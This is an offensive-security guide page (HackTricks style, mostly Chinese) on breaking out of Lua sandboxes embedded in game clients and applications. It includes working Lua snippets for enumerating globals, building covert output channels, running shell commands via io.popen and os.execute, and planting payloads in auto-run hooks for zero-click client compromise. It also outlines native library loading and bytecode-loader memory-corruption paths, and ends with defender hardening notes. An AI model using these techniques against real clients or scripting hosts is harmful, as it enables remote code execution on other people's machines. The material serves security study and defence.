# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

本页收集了用于枚举并从嵌入在应用中的 Lua “sandboxes” 中突破的实用技术（尤其是 game clients、plugins 或应用内脚本引擎）。许多引擎暴露了受限的 Lua 环境，但仍会留下可访问的强大 globals；如果暴露 bytecode loaders，就可能实现任意命令执行甚至本机内存损坏。

关键思路：
- 把 VM 当作未知环境来处理：枚举 _G，发现哪些危险的 primitives 可达。
- 当 stdout/print 被屏蔽时，滥用任何 in-VM 的 UI/IPC 通道作为输出汇点以观察结果。
- 如果 io/os 可用，通常可以直接执行命令（io.popen、os.execute）。
- 如果暴露了 load/loadstring/loadfile，执行精心构造的 Lua bytecode 可能会在某些版本中破坏内存安全（≤5.1 的 verifiers 可被绕过；5.2 已移除 verifier），从而实现高级利用。

## 枚举 the sandboxed environment

- 转储 global environment，以清点可访问的 tables/functions：
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- 如果没有 print() 可用，可重用 in-VM channels。以下示例来自一个 MMO housing 脚本 VM：chat 输出只有在 sound call 之后才生效；下面构建了一个可靠的输出函数：
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
将此模式泛化到你的目标：任何接受字符串的 textbox、toast、logger 或 UI callback 都可以作为 stdout 用于 reconnaissance。

## 如果 io/os 被暴露则可直接执行命令

如果 sandbox 仍然暴露标准库 io 或 os，你很可能立即获得命令执行：
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- 执行发生在客户端进程内；许多阻止外部调试器的 anti-cheat/antidebug 层不会阻止 in-VM 进程创建。
- 还要检查：package.loadlib (arbitrary DLL/.so loading)、require with native modules、LuaJIT's ffi (if present)、以及 debug library（可能在 VM 内提升权限）。

## Zero-click triggers via auto-run callbacks

如果宿主应用将脚本推送到客户端，且 VM 暴露 auto-run hooks（例如 OnInit/OnLoad/OnEnter），在脚本加载时立即将 payload 放到这些钩子中以实现 drive-by compromise：
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
任何等效的回调（OnLoad、OnEnter 等）都会在脚本被自动传输并在客户端执行时使该技术泛化。

## 在 recon 期间要寻找的危险原语

在对 _G 进行枚举时，特别注意查找：
- io、os：io.popen、os.execute、file I/O、env access。
- load、loadstring、loadfile、dofile：执行源代码或字节码；支持加载不受信任的字节码。
- package、package.loadlib、require：动态库加载和模块暴露面。
- debug：setfenv/getfenv（≤5.1）、getupvalue/setupvalue、getinfo，以及 hooks。
- LuaJIT-only：ffi.cdef、ffi.load，用于直接调用本地代码。

最小使用示例（如果可达）：
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## 可选的权限提升：滥用 Lua bytecode loaders

当 load/loadstring/loadfile 可达但 io/os 受限时，执行精心构造的 Lua bytecode 可能导致内存泄露和破坏原语。关键要点：
- Lua ≤ 5.1 附带一个已知可被绕过的 bytecode verifier。
- Lua 5.2 完全移除了 verifier（官方立场：应用程序应直接拒绝预编译的 chunks），如果不禁止 bytecode 加载，则扩大了攻击面。
- 典型流程：通过 in-VM 输出 leak pointers，构造 bytecode 以制造类型混淆（例如围绕 FORLOOP 或其他 opcodes），然后转向 arbitrary read/write 或 native code execution。

该路径与 engine/version 相关，并且需要 RE。详见 references 中的深入分析、利用原语和游戏中的示例 gadgetry。

## Detection and hardening notes (for defenders)

- 服务器端：拒绝或重写用户脚本；白名单安全 APIs；移除或绑定为空 io、os、load/loadstring/loadfile/dofile、package.loadlib、debug、ffi。
- 客户端：以最小 _ENV 运行 Lua，禁止 bytecode 加载，重新引入严格的 bytecode verifier 或签名校验，并阻止客户端进程创建子进程。
- 遥测：在 script 加载后不久检测到 gameclient → 子进程创建时触发告警；与 UI/chat/script 事件进行关联。

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
